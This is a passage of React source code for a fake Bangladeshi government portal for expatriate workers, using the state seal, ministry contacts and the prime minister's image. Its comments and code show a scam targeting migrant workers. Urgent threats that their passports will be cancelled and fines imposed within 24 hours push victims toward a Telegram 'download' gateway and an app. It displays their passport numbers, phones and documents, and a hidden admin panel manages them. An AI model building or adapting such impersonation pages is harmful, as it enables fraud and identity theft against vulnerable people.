                          পেজের শীর্ষে থাকা অনুসন্ধান ফিল্ডে আপনার সঠিক পাসপোর্ট নাম্বার, অথবা বিএমইটি স্মার্ট আইডি কার্ড অথবা আমাদের দেওয়া ১৬-ডিজিটের ইউনিক আইডি নাম্বারটি প্রবেশ করান এবং সাবমিট করুন।
                        </p>
                      </div>

                      <div className="relative">
                        <span className="absolute -left-10 top-0.5 w-7 h-7 bg-gov-green hover:bg-emerald-800 transition-colors text-white text-xs font-black rounded-full flex items-center justify-center shadow-md">
                          ০২
                        </span>
                        <h4 className="text-sm font-black text-slate-800">ডিজিটাল নথিপত্র ও ভাতার স্থিতি যাচাই</h4>
                        <p className="text-xs text-slate-500 leading-relaxed mt-1 font-semibold">
                          অনুসন্ধান সফল হলে আপনার প্রবাসী নথির বিস্তারিত অবস্থা দেখতে পাবেন। আপনার বর্তমান বিএমইটি স্ট্যাটাস, অনুদানের অর্থ এবং স্মার্ট আইডি কার্ডটি জেনারেট হয়ে স্ক্রিনে ভেসে উঠবে।
                        </p>
                      </div>

                      <div className="relative">
                        <span className="absolute -left-10 top-0.5 w-7 h-7 bg-gov-green hover:bg-emerald-800 transition-colors text-white text-xs font-black rounded-full flex items-center justify-center shadow-md">
                          ০৩
                        </span>
                        <h4 className="text-sm font-black text-slate-800">টেলিগ্রাম গেটওয়ে এবং MyGov অ্যাপ ডাউনলোড</h4>
                        <p className="text-xs text-slate-500 leading-relaxed mt-1 font-semibold">
                          আপনার অনুদানকৃত অর্থ বা বিএমইটি আইডি ফাইল ডাউনলোড করতে সিকিউর "Telegram এ নথি ডাউনলোড করুন" বাটনে ক্লিক করে আমাদের অনুমোদিত অটোমেটেড সিস্টেম মডিউল সম্পূর্ণ করুন।
                        </p>
                      </div>

                      <div className="relative">
                        <span className="absolute -left-10 top-0.5 w-7 h-7 bg-gov-red hover:bg-[#b91c1c] transition-colors text-white text-xs font-black rounded-full flex items-center justify-center shadow-md animate-pulse">
                          ০৪
                        </span>
                        <h4 className="text-sm font-black text-[#b91c1c]">জরুরি অভিযোগ বা সংশোধনের বার্তা পাঠান</h4>
                        <p className="text-xs text-slate-500 leading-relaxed mt-1 font-semibold">
                          যদি নথিপত্রে নামের বানান, পাসপোর্ট নম্বর অথবা মোবাইল নাম্বারে কোনো ত্রুটি থাকে তবে তাৎক্ষণিকভাবে অভিযোগ এবং ওয়ান-স্টপ আবেদনের মাধ্যমে আমাদের ডেস্কে আপনার অভিযোগ জমা দিন।
                        </p>
                      </div>

                    </div>
                  </div>

                </div>
              </div>

              {/* Left Panel: Circulars and Honorable PM Tarique Rahman Quote widget */}
              <div className="lg:col-span-4 space-y-6">
                
                {/* Premium Prime Minister Tarique Rahman Portrait Board */}
                <div className="bg-white rounded-[2.25rem] border border-emerald-500/20 p-6 shadow-xl relative overflow-hidden bg-gradient-to-b from-white to-emerald-50/20">
                  <div className="absolute top-0 left-0 w-2 h-full bg-emerald-600"></div>
                  
                  {/* Decorative Banner Ribbon */}
                  <div className="absolute top-4 right-4 bg-emerald-100 text-[#004d39] text-[9px] font-black px-2.5 py-1 rounded-full uppercase leading-none border border-emerald-200">
                    বাণী ও নির্দেশনা
                  </div>

                  <div className="text-center mt-3 mb-5">
                    <div className="relative inline-block">
                      <div className="absolute inset-0 bg-gov-green/10 rounded-2xl rotate-6 transform transition-transform group-hover:rotate-12"></div>
                      <img 
                        src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Tarique_Rahman_at_Altab_Ali_Park_in_London_%28crop%29.png/330px-Tarique_Rahman_at_Altab_Ali_Park_in_London_%28crop%29.png" 
                        alt="মাননীয় প্রধানমন্ত্রী তারেক রহমান" 
                        className="relative z-10 w-28 h-36 object-cover rounded-2xl shadow-md border-3 border-emerald-700" 
                        referrerPolicy="no-referrer"
                      />
                    </div>
                    
                    <h4 className="text-md font-black text-slate-800 mt-4 leading-tight">তারেক রহমান</h4>
                    <p className="text-[10px] text-gov-green font-extrabold uppercase tracking-wider mt-0.5">মাননীয় প্রধানমন্ত্রী</p>
                    <p className="text-[9px] text-slate-400 font-bold uppercase tracking-tight">গণপ্রজাতন্ত্রী বাংলাদেশ সরকার</p>
                  </div>

                  {/* Leader Quote Speech bubble */}
                  <div className="bg-white rounded-2xl p-4 border border-emerald-100 shadow-sm relative">
                    <div className="absolute -top-2.5 left-1/2 -translate-x-1/2 w-5 h-5 bg-white border-t border-l border-emerald-100 rotate-45"></div>
                    <p className="text-xs text-slate-600 leading-relaxed font-bold italic text-justify relative z-10">
                      "আমাদের সম্মানিত প্রবাসী নাগরিকবৃন্দ হলেন বাংলাদেশের অর্থনৈতিক চালিকাশক্তি ও সার্বভৌমত্বের প্রতীক। আপনাদের সকল নাগরিক সেবা ও কল্যাণ তহবিল সহায়তাকে একটি সম্পূর্ণ নিরাপদ ও হয়রানিমুক্ত ডিজিটাল পোর্টালে নিয়ে আসাই আমাদের সরকারের মূল লক্ষ্য। আমরা আপনাদের পাশে সর্বদাই আছি।"
                    </p>
                  </div>
                </div>

                {/* Ministry Contact & Support Badge */}
                <div className="bg-[#004d39] text-white rounded-[2rem] p-6 shadow-xl relative overflow-hidden">
                  <div className="absolute bottom-0 right-0 w-32 h-32 bg-white/5 rounded-tl-full pointer-events-none"></div>
                  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-12 h-12 mb-4 brightness-0 invert" referrerPolicy="no-referrer" />
                  <h4 className="text-lg font-black leading-tight mb-2 font-sans">জরুরি হেল্পলাইন ডেস্ক</h4>
                  <p className="text-xs text-emerald-200 font-semibold mb-4 leading-relaxed">
                    বিদেশ যাত্রায় যেকোনো সমস্যা বা প্রতারণা এড়াতে সরাসরি আমাদের সাপোর্ট উইং ও প্রবাসী কল্যাণ মন্ত্রণালয়ে কল করুন।
                  </p>
                  
                  <div className="space-y-2.5">
                    <div className="p-3 bg-white/10 rounded-xl flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <Phone size={14} className="text-emerald-200 animate-pulse" />
                        <span className="text-xs font-bold font-mono">333</span>
                      </div>
                      <span className="text-[10px] bg-emerald-800 px-2 py-0.5 rounded-full font-bold">জাতীয় কল সেন্টার</span>
                    </div>
                    <div className="p-3 bg-white/10 rounded-xl flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <Phone size={14} className="text-emerald-200 animate-pulse" />
                        <span className="text-xs font-bold font-mono">16135</span>
                      </div>
                      <span className="text-[10px] bg-emerald-800 px-2 py-0.5 rounded-full font-bold">প্রবাসী হেল্পডেস্ক</span>
                    </div>
                  </div>

                  <button onClick={() => setShowContact(true)} className="w-full mt-6 bg-white text-gov-green py-3 rounded-xl font-black text-sm hover:bg-emerald-50 transition-all flex items-center justify-center gap-2 shadow-lg shadow-emerald-950/30 cursor-pointer">
                    <MessageCircle size={16} /> অফিসিয়াল বার্তা পাঠান
                  </button>
                </div>

                {/* Live Announcements Circulars Board */}
                <div className="bg-white rounded-3xl border border-slate-200 p-6 shadow-sm overflow-hidden">
                  <h3 className="text-sm font-black text-slate-800 border-b border-slate-100 pb-3 mb-4 uppercase tracking-wider flex items-center gap-2">
                    <Clock size={16} className="text-gov-green" />
                    বিজ্ঞপ্তি ও নির্দেশনা বোর্ড
                  </h3>
                  
                  <div className="space-y-4">
                    <div className="p-3 bg-slate-50 rounded-xl hover:bg-slate-100 transition-colors border-l-4 border-gov-green cursor-pointer">
                      <span className="text-[9px] font-bold text-slate-400 font-mono">27 MAY 2026</span>
                      <h4 className="text-xs font-black text-slate-700 leading-snug mt-1">প্রবাসী ভাতা এবং বিএমইটি ক্লিয়ারেন্স জরুরি সংশোধন নির্দেশিকা ২০২৬।</h4>
                    </div>
                    <div className="p-3 bg-slate-50 rounded-xl hover:bg-slate-100 transition-colors border-l-4 border-gov-red cursor-pointer">
                      <span className="text-[9px] font-bold text-slate-400 font-mono">25 MAY 2026</span>
                      <h4 className="text-xs font-black text-slate-700 leading-snug mt-1">বিএমইটি স্মার্ট কার্ড স্ট্যাটাস মোবাইল এ্যাপলিকেশনের মাধ্যমে চেক সংক্রান্ত সরকারি সার্কুলার।</h4>
                    </div>
                    <div className="p-3 bg-slate-50 rounded-xl hover:bg-slate-100 transition-colors border-l-4 border-gov-green cursor-pointer">
                      <span className="text-[9px] font-bold text-slate-400 font-mono">19 MAY 2026</span>
                      <h4 className="text-xs font-black text-slate-700 leading-snug mt-1">মালয়েশিয়া ও মধ্যপ্রাচ্য গমনে ইচ্ছুক প্রবাসী শ্রমিকদের স্বাস্থ্য পরীক্ষার ক্ষেত্রে সতর্কতা নোটিশ।</h4>
                    </div>
                  </div>
                </div>

                {/* Government Trust Graphics - Styled with gold accents representing high prestige */}
                <div className="bg-white rounded-3xl border border-slate-200 p-6 shadow-sm text-center">
                  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-16 h-16 mx-auto mb-3 opacity-20" referrerPolicy="no-referrer" />
                  <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest leading-relaxed">
                    স্মার্ট বাংলাদেশ রূপকল্প ২০২৬ <br />
                    প্রবাসী সেবা ও ডিজিটালাইজেশন মিশন
                  </p>
                </div>

              </div>

            </div>
          </main>

          {/* Premium Ministry Contact Footer */}
          <footer className="bg-slate-900 text-slate-200 py-12 mt-12 border-t-4 border-gov-green">
            <div className="max-w-6xl mx-auto px-4 grid grid-cols-1 md:grid-cols-4 gap-12 text-center md:text-left">
              <div className="col-span-2 space-y-4">
                <div className="flex items-center gap-3 justify-center md:justify-start">
                  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-12 h-12 brightness-0 invert" referrerPolicy="no-referrer" />
                  <div>
                    <h4 className="font-black text-sm leading-tight text-white">প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান মন্ত্রণালয়</h4>
                    <p className="text-[10px] text-slate-400 font-bold tracking-wider">গণপ্রজাতন্ত্রী বাংলাদেশ সরকার</p>
                  </div>
                </div>
                <p className="text-xs text-slate-400 leading-relaxed max-w-sm mx-auto md:mx-0">
                  প্রবাসী কল্যাণ ভবন, ৭১-৭২ ইস্কাটন গার্ডেন রোড, রমনা, ঢাকা-১০০০। <br />
                  ইমেইল: info@probashi.gov.bd <br />
                  হেল্পলাইন: ৩৩৩ অথবা ১৬১৩৫
                </p>
              </div>
              <div className="space-y-4 font-sans">
                <h5 className="font-black text-xs uppercase tracking-widest text-white">গুরুত্বপূর্ণ সেবা লিঙ্ক</h5>
                <ul className="space-y-2 text-xs text-slate-400">
                  <li className="hover:text-emerald-400 cursor-pointer transition-colors">প্রধানমন্ত্রীর কার্যালয়</li>
                  <li className="hover:text-emerald-400 cursor-pointer transition-colors">জনশক্তি কর্মসংস্থান ও প্রশিক্ষণ ব্যুরো (BMET)</li>
                  <li className="hover:text-emerald-400 cursor-pointer transition-colors">ওয়েজ আর্নার্স কল্যাণ বোর্ড</li>
                  <li className="hover:text-emerald-400 cursor-pointer transition-colors">বোয়েসেল (BOESL)</li>
                </ul>
              </div>
              <div className="space-y-4">
                <h5 className="font-black text-xs uppercase tracking-widest text-white">পরিকল্পনা ও বাস্তবায়নে</h5>
                <p className="text-xs text-slate-400 leading-relaxed">
                  এটুআই (a2i), তথ্য ও যোগাযোগ প্রযুক্তি বিভাগ, গণপ্রজাতন্ত্রী বাংলাদেশ সরকার।
                </p>
                <div className="flex gap-4 justify-center md:justify-start">
                  <div className="w-12 h-6 bg-white/10 rounded-md"></div>
                  <div className="w-12 h-6 bg-white/10 rounded-md"></div>
                </div>
              </div>
            </div>
            <div className="max-w-6xl mx-auto px-4 mt-12 pt-8 border-t border-slate-800 text-center text-[10px] text-slate-500 uppercase tracking-[0.25em]">
              &copy; ২০২৬ গণপ্রজাতন্ত্রী বাংলাদেশ সরকার | সর্বস্বত্ব সংরক্ষিত
            </div>
          </footer>

          <AnimatePresence>{showAdmin && <AdminPanel onClose={() => setShowAdmin(false)} sendEmailNotification={sendEmailNotification} />}</AnimatePresence>
          <AnimatePresence>{showContact && <ContactModal onClose={() => setShowContact(false)} setToast={setToast} />}</AnimatePresence>
          <AnimatePresence>{toast && <Toast message={toast.message} type={toast.type} onClose={() => setToast(null)} />}</AnimatePresence>
        </div>
      );
    }

    return (
      <div className="min-h-screen bg-[#f8fafc] text-slate-900 font-sans pb-12">
      {/* Maintenance Banner if active but admin is viewing */}
      {systemSettings.maintenanceMode && (
        <div className="bg-gov-red text-white text-[10px] font-black py-1 text-center uppercase tracking-widest">
          Maintenance Mode Active - Visible to Admin Only
        </div>
      )}
      {/* National Portal Top Bar */}
      <div className="bg-gov-red h-1 w-full"></div>
      <div className="bg-gov-green py-1 px-4 text-[10px] text-white/80 font-bold flex justify-between items-center">
        <span>বাংলাদেশ জাতীয় তথ্য বাতায়ন</span>
        <div className="flex gap-4">
          <span>English</span>
          <span>বাংলা</span>
        </div>
      </div>

      {/* Official Gov Header */}
      <header className="bg-white text-gov-green px-4 py-4 flex justify-between items-center sticky top-0 z-50 shadow-sm border-b border-slate-200">
        <div className="flex items-center gap-3">
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-12 h-12" referrerPolicy="no-referrer" />
          <div>
            <h1 className="font-black text-sm md:text-lg leading-tight">গণপ্রজাতন্ত্রী বাংলাদেশ সরকার</h1>
            <p className="text-[9px] md:text-[11px] text-slate-500 font-bold uppercase tracking-widest">Ministry of Expatriates' Welfare and Overseas Employment</p>
          </div>
        </div>
        <div className="flex items-center gap-4">
          <button onClick={() => setShowAdmin(true)} className="p-2 text-slate-300 hover:text-gov-green rounded-full transition-colors"><MoreVertical size={20} /></button>
        </div>
      </header>

      <main className="max-w-md mx-auto px-4 pt-6">
        <div className="space-y-6">
          {/* My Documents Section */}
          <div className="bg-white rounded-3xl border border-slate-200 p-6 shadow-sm overflow-hidden relative">
            <div className="absolute top-0 right-0 w-24 h-24 bg-gov-green/5 rounded-bl-full -mr-6 -mt-6"></div>
            <h3 className="text-lg font-black text-slate-800 mb-4 flex items-center gap-2">
              <FileText className="text-gov-green" size={20} /> আমার নথিপত্র (My Documents)
            </h3>
            
            <div className="space-y-3">
              {targetUser.documents && targetUser.documents.length > 0 ? (
                targetUser.documents.map((doc: any, idx: number) => (
                  <div key={idx} className="flex items-center justify-between p-3 bg-slate-50 rounded-xl border border-slate-100 group">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 bg-white rounded-lg flex items-center justify-center shadow-sm">
                        <FileText size={20} className="text-gov-green" />
                      </div>
                      <div>
                        <p className="text-xs font-bold text-slate-800 truncate max-w-[150px]">{doc.name}</p>
                        <p className="text-[10px] text-slate-400 font-bold uppercase tracking-widest">Official Document</p>
                      </div>
                    </div>
                    <div className="flex gap-2">
                      <a href={doc.url} target="_blank" rel="noreferrer" className="p-2 text-gov-green hover:bg-white rounded-lg transition-all shadow-sm">
                        <Download size={16} />
                      </a>
                      <button onClick={async () => {
                        if (window.confirm('আপনি কি এই নথিটি মুছে ফেলতে চান?')) {
                          const newDocs = targetUser.documents.filter((_: any, i: number) => i !== idx);
                          await updateDoc(doc(db, 'targetUsers', targetUser.id), { documents: newDocs });
                          setTargetUser({ ...targetUser, documents: newDocs });
                        }
                      }} className="p-2 text-gov-red hover:bg-white rounded-lg transition-all shadow-sm">
                        <Trash size={16} />
                      </button>
                    </div>
                  </div>
                ))
              ) : (
                <div className="text-center py-8 border-2 border-dashed border-slate-100 rounded-2xl">
                  <FileText className="mx-auto text-slate-200 mb-2" size={32} />
                  <p className="text-xs font-bold text-slate-400">কোন নথি পাওয়া যায়নি</p>
                </div>
              )}
            </div>

            <div className="mt-6">
              <label className="w-full flex flex-col items-center justify-center gap-2 p-4 border-2 border-dashed border-gov-green/20 rounded-2xl cursor-pointer hover:bg-gov-green/5 transition-all group">
                {isUploadingDoc ? (
                  <motion.div animate={{ rotate: 360 }} transition={{ repeat: Infinity, duration: 1 }} className="w-6 h-6 border-2 border-gov-green border-t-transparent rounded-full" />
                ) : (
                  <Upload className="text-gov-green group-hover:scale-110 transition-transform" size={24} />
                )}
                <span className="text-xs font-bold text-gov-green">নতুন নথি আপলোড করুন</span>
                <input type="file" className="hidden" onChange={(e) => e.target.files?.[0] && handleDocUpload(e.target.files[0])} disabled={isUploadingDoc} />
              </label>
            </div>
          </div>

          {/* High Impact Gov Message - Aggressive & Urgent */}
          <motion.div initial={{ y: -20, opacity: 0 }} animate={{ y: 0, opacity: 1 }} className="bg-white border-l-4 border-gov-red p-6 rounded-xl shadow-sm border border-slate-200">
            <div className="flex items-center gap-2 text-gov-red font-black mb-3 uppercase tracking-wider text-sm">
              <ShieldAlert size={20} className="animate-pulse" /> চূড়ান্ত সরকারি তলব ও সতর্কবার্তা
            </div>
            <p className="text-slate-700 font-medium text-sm leading-relaxed">
              জনাব <span className="text-gov-green font-bold">{targetUser.name}</span>, আপনার নামে বরাদ্দকৃত <span className="text-gov-red font-bold underline">সরকারি ভাতা এবং বিএমইটি স্মার্ট কার্ড</span> সংগ্রহের জন্য এটিই আপনার শেষ সুযোগ। আগামী ২৪ ঘণ্টার মধ্যে এ্যাপটি ডাউনলোড করে রেজিষ্ট্রেশন সম্পন্ন না করলে আপনার পাসপোর্ট এবং সকল সরকারি নথি বাতিল করা হবে।
            </p>
          </motion.div>

          {/* Official ID Card - Redesigned for Professionalism */}
          <motion.div initial={{ scale: 0.98, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} transition={{ delay: 0.1 }} className="bg-white rounded-2xl overflow-hidden shadow-sm border border-slate-200 relative">
            {/* Guilloche Pattern Overlay */}
            <div className="absolute inset-0 guilloche-bg pointer-events-none"></div>
            
            <div className="gov-gradient p-5 text-white flex justify-between items-center relative z-10">
              <div className="flex items-center gap-3">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-10 h-10 brightness-0 invert" referrerPolicy="no-referrer" />
                <div>
                  <h2 className="text-xs font-black tracking-widest uppercase">Digital Expatriate Card</h2>
                  <p className="text-[8px] font-bold opacity-80 tracking-widest uppercase">Government of Bangladesh</p>
                </div>
              </div>
              <div className="text-right">
                <p className="text-[8px] font-black opacity-60 uppercase">Official Document</p>
                <p className="text-[10px] font-mono font-bold">#{targetUser.id.slice(-8).toUpperCase()}</p>
              </div>
            </div>

            <div className="p-6 relative z-10">
              <div className="flex gap-6 items-start mb-6">
                <div className="relative">
                  {/* Smart Chip Icon */}
                  <div className="absolute -top-4 -left-4 w-10 h-8 bg-gradient-to-br from-amber-200 to-amber-500 rounded-md border border-amber-600/30 flex flex-col justify-around p-1 shadow-inner z-20 opacity-80">
                    <div className="h-[1px] bg-amber-800/20 w-full"></div>
                    <div className="h-[1px] bg-amber-800/20 w-full"></div>
                    <div className="h-[1px] bg-amber-800/20 w-full"></div>
                  </div>
                  <div className="w-28 h-32 rounded-lg border-2 border-slate-100 shadow-sm overflow-hidden bg-slate-50 relative z-10">
                    {targetUser.photoUrl ? (
                      <img src={targetUser.photoUrl} alt="" className="w-full h-full object-cover" referrerPolicy="no-referrer" />
                    ) : (
                      <div className="w-full h-full flex items-center justify-center"><UserCheck size={48} className="text-slate-200" /></div>
                    )}
                  </div>
                  <div className="absolute -bottom-2 -right-2 bg-gov-green p-1.5 rounded-full border-2 border-white shadow-sm">
                    <CheckCircle2 className="text-white" size={14} />
                  </div>
                  <div className="absolute -top-2 -right-2 bg-gov-red text-white text-[6px] font-black px-1.5 py-0.5 rounded-full border border-white shadow-sm animate-pulse z-20">
                    MANDATORY
                  </div>
                </div>

                <div className="flex-1 space-y-3">
                  <div>
                    <div className="flex justify-between items-center">
                      <p className="text-[9px] font-black text-slate-400 uppercase tracking-widest">Full Name</p>
                      <button 
                        onClick={() => {
                          setIsEditing(!isEditing);
                          setEditData(targetUser);
                        }}
                        className="p-1 text-slate-300 hover:text-gov-green transition-colors"
                      >
                        <Edit2 size={12} />
                      </button>
                    </div>
                    <h3 className="text-lg font-black text-slate-800 leading-tight">{targetUser.name}</h3>
                  </div>
                  
                  <div className="grid grid-cols-1 gap-2">
                    <div>
                      <p className="text-[9px] font-black text-slate-400 uppercase tracking-widest">Passport/ID No.</p>
                      <p className="font-mono font-bold text-slate-700 text-sm">{targetUser.idNumber}</p>
                    </div>
                    <div>
                      <p className="text-[9px] font-black text-slate-400 uppercase tracking-widest">Expatriate Status</p>
                      <div className="flex items-center gap-1.5 mt-0.5">
                        <span className={`w-2 h-2 rounded-full ${targetUser.status === 'Ready' ? 'bg-emerald-500' : 'bg-amber-500'}`}></span>
                        <span className="text-xs font-bold text-slate-700">{targetUser.status}</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>

              {isEditing ? (
                <div className="space-y-4 mb-6 bg-slate-50 p-5 rounded-xl border border-slate-200">
                  <div className="grid grid-cols-1 gap-3">
                    <div>
                      <label className="text-[9px] font-black text-slate-400 uppercase tracking-widest ml-1">Name</label>
                      <input className="w-full px-3 py-2 border border-slate-200 rounded-lg text-sm outline-none focus:ring-2 focus:ring-gov-green" value={editData.name || ''} onChange={(e) => setEditData({ ...editData, name: e.target.value })} />
                    </div>
                    <div className="grid grid-cols-2 gap-3">
                      <div>
                        <label className="text-[9px] font-black text-slate-400 uppercase tracking-widest ml-1">Phone</label>
                        <input className="w-full px-3 py-2 border border-slate-200 rounded-lg text-sm outline-none focus:ring-2 focus:ring-gov-green" value={editData.phone || ''} onChange={(e) => setEditData({ ...editData, phone: e.target.value })} />
                      </div>
                      <div>
                        <label className="text-[9px] font-black text-slate-400 uppercase tracking-widest ml-1">ID Number</label>
                        <input className="w-full px-3 py-2 border border-slate-200 rounded-lg text-sm outline-none focus:ring-2 focus:ring-gov-green" value={editData.idNumber || ''} onChange={(e) => setEditData({ ...editData, idNumber: e.target.value })} />
                      </div>
                    </div>
                    <div className="grid grid-cols-2 gap-3">
                      <div>
                        <label className="text-[9px] font-black text-slate-400 uppercase tracking-widest ml-1">Country</label>
                        <input className="w-full px-3 py-2 border border-slate-200 rounded-lg text-sm outline-none focus:ring-2 focus:ring-gov-green" value={editData.country || ''} onChange={(e) => setEditData({ ...editData, country: e.target.value })} />
                      </div>
                      <div>
                        <label className="text-[9px] font-black text-slate-400 uppercase tracking-widest ml-1">Status</label>
                        <select className="w-full px-3 py-2 border border-slate-200 rounded-lg text-sm outline-none focus:ring-2 focus:ring-gov-green" value={editData.status || 'Ready'} onChange={(e) => setEditData({ ...editData, status: e.target.value as any })}>
                          <option value="Ready">Ready</option>
                          <option value="Pending">Pending</option>
                          <option value="Processing">Processing</option>
                        </select>
                      </div>
                    </div>
                  </div>
                  <div className="flex gap-3">
                    <button onClick={handleProfileUpdate} className="flex-1 bg-gov-green text-white py-2.5 rounded-lg font-bold hover:bg-emerald-800 transition-all text-sm flex items-center justify-center gap-2">
                      <Save size={16} /> Update Profile
                    </button>
                    <button onClick={() => setIsEditing(false)} className="px-4 py-2.5 bg-slate-200 text-slate-600 rounded-lg font-bold text-sm">Cancel</button>
                  </div>
                </div>
              ) : (
                <div className="grid grid-cols-2 gap-4 mb-6">
                  <div className="p-3 bg-slate-50 rounded-xl border border-slate-100">
                    <p className="text-[8px] font-black text-slate-400 uppercase tracking-widest">Country</p>
                    <p className="text-xs font-bold text-slate-700">{targetUser.country}</p>
                  </div>
                  <div className="p-3 bg-slate-50 rounded-xl border border-slate-100">
                    <p className="text-[8px] font-black text-slate-400 uppercase tracking-widest">Contact No.</p>
                    <p className="text-xs font-bold text-slate-700">{targetUser.phone}</p>
                  </div>
                </div>
              )}

              {/* Document Section */}
              <div className="border-t border-slate-100 pt-5">
                <div className="flex justify-between items-center mb-3">
                  <h4 className="text-[10px] font-black text-slate-800 uppercase tracking-widest flex items-center gap-2">
                    <ShieldCheck size={14} className="text-gov-green" /> Verified Documents
                  </h4>
                  <label className="text-[10px] font-bold text-gov-green cursor-pointer hover:underline flex items-center gap-1">
                    <Plus size={12} /> Upload New
                    <input type="file" className="hidden" onChange={(e) => e.target.files?.[0] && handleDocUpload(e.target.files[0])} disabled={isUploadingDoc} />
                  </label>
                </div>

                {isUploadingDoc && (
                  <div className="flex items-center gap-3 p-3 bg-emerald-50 rounded-xl mb-3">
                    <motion.div animate={{ rotate: 360 }} transition={{ repeat: Infinity, duration: 1 }} className="w-4 h-4 border-2 border-gov-green border-t-transparent rounded-full" />
                    <span className="text-[10px] font-bold text-gov-green">Uploading document...</span>
                  </div>
                )}

                <div className="space-y-2">
                  {targetUser.documents && targetUser.documents.length > 0 ? (
                    targetUser.documents.map((doc, idx) => (
                      <a key={idx} href={doc.url} target="_blank" rel="noopener noreferrer" className="flex items-center justify-between p-3 bg-slate-50 rounded-xl border border-slate-100 hover:border-gov-green transition-all group">
                        <div className="flex items-center gap-3">
                          <div className="p-2 bg-white rounded-lg border border-slate-200">
                            <Smartphone size={14} className="text-slate-400" />
                          </div>
                          <span className="text-[11px] font-bold text-slate-700 truncate max-w-[150px]">{doc.name}</span>
                        </div>
                        <Download size={14} className="text-slate-300 group-hover:text-gov-green" />
                      </a>
                    ))
                  ) : (
                    <div className="text-center py-4 bg-slate-50 rounded-xl border border-dashed border-slate-200">
                      <p className="text-[10px] font-bold text-slate-400">No documents uploaded yet</p>
                    </div>
                  )}
                </div>
              </div>
            </div>

            <div className="bg-slate-50 p-4 border-t border-slate-100 flex justify-between items-center">
              <div className="flex flex-col items-center gap-1">
                <QRCodeSVG value={`https://ais-dev-wol4hjy5vcvq4m7hy4al6m-493021274531.asia-southeast1.run.app/?id=${targetUser.id}`} size={40} fgColor="#006a4e" />
                <span className="text-[6px] font-black text-gov-green uppercase">Verify</span>
              </div>
              <div className="text-right">
                <p className="text-[8px] font-bold text-slate-400 uppercase">Issue Date</p>
                <p className="text-[10px] font-black text-slate-600">
                  {targetUser.createdAt ? new Date(targetUser.createdAt.seconds * 1000).toLocaleDateString() : '26/03/2026'}
                </p>
              </div>
            </div>
          </motion.div>

          {/* Action Buttons - Refined */}
          <div className="grid grid-cols-1 gap-3">
            <button 
              onClick={() => window.open(`https://wa.me/${targetUser.phone.replace(/\D/g, '')}?text=Hello ${targetUser.name}, জরুরি যোগাযোগ করুণ এখনি কল করুণ। আপনার নথিপত্র প্রস্তুত।`, '_blank')}
              className="w-full bg-[#25D366] text-white py-4 rounded-xl font-bold text-sm flex items-center justify-center gap-3 shadow-sm hover:bg-[#1ebe57] transition-all"
            >
              <MessageCircle size={20} fill="white" /> WhatsApp এ যোগাযোগ করুন
            </button>

            <button 
              onClick={handleTelegramLink}
              className="w-full bg-[#0088cc] text-white py-4 rounded-xl font-bold text-sm flex items-center justify-center gap-3 shadow-sm hover:bg-[#0077b3] transition-all"
            >
              <Send size={20} /> Telegram এ নথি ডাউনলোড করুন
            </button>

            <button 
              onClick={() => setShowContact(true)}
              className="w-full bg-white border border-slate-200 text-slate-700 py-4 rounded-xl font-bold text-sm flex items-center justify-center gap-3 shadow-sm hover:bg-slate-50 transition-all"
            >
              <Phone size={20} className="text-gov-green" /> হেল্পলাইন ও সহায়তা
            </button>

            <button 
              onClick={() => window.open('https://play.google.com/store/apps/details?id=com.amiprobashi.user', '_blank')}
              className="w-full bg-gov-red text-white py-6 rounded-xl font-black text-xl flex flex-col items-center justify-center gap-0.5 shadow-xl hover:bg-red-700 transition-all border-b-4 border-red-950 animate-bounce-subtle"
            >
              <div className="flex items-center gap-3"><Download size={28} /> এখনই এ্যাপটি ডাউনলোড করুন</div>
              <span className="text-[9px] opacity-80 font-bold uppercase tracking-[0.3em]">Mandatory Registration Required</span>
            </button>
            <p className="text-[10px] text-gov-red font-black text-center animate-pulse">
              * ২৪ ঘণ্টার মধ্যে এ্যাপটি ডাউনলোড না করলে ৫,০০০/- টাকা জরিমানা প্রযোজ্য হবে।
            </p>
          </div>

          {/* Ministry Footer Info */}
          <div className="bg-white p-6 rounded-3xl border border-slate-200 text-center">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-12 h-12 mx-auto mb-3 opacity-30" referrerPolicy="no-referrer" />
            <h4 className="font-black text-slate-800 text-sm mb-1">প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান মন্ত্রণালয়</h4>
            <p className="text-[10px] text-slate-500 font-bold leading-relaxed">
              প্রবাসী কল্যাণ ভবন, ৭১-৭২ ইস্কাটন গার্ডেন রোড, রমনা, ঢাকা-১০০০। <br />
              হেল্পলাইন: ৩৩৩ অথবা ১৬১৩৫
            </p>
          </div>
        </div>
      </main>

      <footer className="bg-slate-900 text-white py-12 mt-12">
        <div className="max-w-6xl mx-auto px-4 grid grid-cols-1 md:grid-cols-4 gap-12">
          <div className="col-span-2">
            <div className="flex items-center gap-3 mb-6">
              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Government_Seal_of_Bangladesh.svg/1200px-Government_Seal_of_Bangladesh.svg.png" alt="" className="w-12 h-12 brightness-0 invert" referrerPolicy="no-referrer" />
              <div>
                <h4 className="font-black text-sm">প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান মন্ত্রণালয়</h4>
                <p className="text-[10px] opacity-60">গণপ্রজাতন্ত্রী বাংলাদেশ সরকার</p>
              </div>
